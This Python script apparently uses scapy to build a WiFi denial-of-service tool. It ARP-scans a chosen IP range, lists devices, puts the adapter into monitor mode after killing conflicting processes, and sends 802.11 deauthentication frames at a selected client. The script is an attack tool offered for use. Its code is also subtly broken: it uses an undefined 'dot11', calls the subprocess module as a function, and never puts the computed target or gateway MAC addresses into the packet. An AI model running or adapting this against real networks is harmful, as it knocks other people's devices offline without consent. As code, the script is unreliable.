from scapy.all import *
import socket
import os
import re

valid_ip_pattern = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]*$")
clients = []

def main():
    in_sudo()
    hacknic = set_interface()
    target_ip = get_ip_range()
    scan_clients(target_ip)
    display_clients()
    while True:
        print()
        print("="*10+"MENU"+"="*10)
        print("1) DOS Client")
        print("2) Rescan")
        print("3) Change IP range")
        print("4) Change wifi interface")
        print("99) Exit")
        choice = int(input("Select Option>> "))
        if choice == 1:
            client_choice = int(input("Choose client from list above (enter negative # to go back): "))
            if clients[int(client_choice)]:
                cls()
                dos_client(client_choice, hacknic)
            elif client_choice < 0:
                continue
            else:
                cls()
                display_clients()
                print("Error, please enter valid client")
        elif choice == 2:
            cls()
            scan_clients(target_ip)
            display_clients()
        elif choice == 3:
            cls()
            target_ip = get_ip_range()
            scan_clients(target_ip)
            display_clients()
        elif choice == 4:
            cls()
            hacknic = set_interface()
        elif choice == 99:
            set_managed_mode(hacknic)
            exit()


def set_interface():
    wlan_pattern = re.compile("^wlan[0-9]+")
    #ifacesm = netifaces.interfaces()
    check_wifi_ifaces = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
    if check_wifi_ifaces == 0:
        print("Please connect a WiFi adapter and try again")
        exit()
    print("The following interfaces are available")
    for index, item in enumerate(check_wifi_ifaces):
        print(f"{index} - {item}")
    while True:
        interface_choice = input("Please select interface from above: ")
        try:
            if check_wifi_ifaces[int(interface_choice)]:
                break
        except:
            print("Please enter a valid number from the options")

    hacknic = check_wifi_ifaces[int(interface_choice)]
    print("Adapter connected, killing conflicting processes now...")
    kill_conflicts = subprocess.run(["sudo", "airmon-ng", "check", "kill"])
    print("Putting Adapter into monitor mode...")
    set_monitored_mode(hacknic)
    return hacknic


def set_monitored_mode(hacknic):
    monitor_mode=subprocess(["sudo", "airmon-ng", "start", hacknic])

def set_managed_mode(hacknic):
    manage_mode=subprocess(["sudo", "airmon-ng", "stop", (hacknic + "mon")])
    subprocess(["sudo", "service", "network-manager", "start"])

def dos_client(client_index, iface):
    target = clients[client_index]
    target_mac = target['mac']
    router_ip = conf.route.route("0.0.0.0")[2]
    gateway_mac = getmacbyip(router_ip)
    monface = str(iface+"mon")
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(packet, inter=0.1, count=100, iface=monface, verbose=1)


def get_ip_range():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        current_ip = s.getsockname()[0]
    except:
        current_ip = '127.0.0.1'
    finally:
        s.close()
    while True:
        print("Current IPv4 Address: " + current_ip)
        target_range = input("Enter valid IP range: ")
        if valid_ip_pattern.search(target_range):
            return target_range
        print("Error, invalid range")
    
def scan_clients(new_ip):
    clients.clear()
    target_range = ARP()
    target_range.pdst = new_ip
    broadcast = Ether(dst='ff:ff:ff:ff:ff:ff') 
    packet = broadcast / target_range
    client = srp(packet, timeout=1)[0]
    for sent, received in client:
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})

def display_clients():
    print("No. |\tDevice Name     |\tIP Address      |\tMAC Address       |")
    print("____|\t________________|\t________________|\t__________________|")
    print()
    for client in clients:
        try:
            print("{}\t{:20}\t{:16}\t{:16}".format(clients.index(client), socket.gethostbyaddr(client['ip'])[0], client['ip'], client['mac']))
            print("-"*76)
        except:
            print("{}\t{:20}\t{:16}\t{:16}".format(clients.index(client), "Unknown Hostname", client['ip'], client['mac']))
            print("-"*76)

def cls():
    os.system('cls' if os.name=='nt' else 'clear')

def in_sudo():
    if not 'SUDO_UID' in os.environ.keys():
        print("Must run in sudo. Exiting...")
        exit()

if __name__=="__main__":
    main()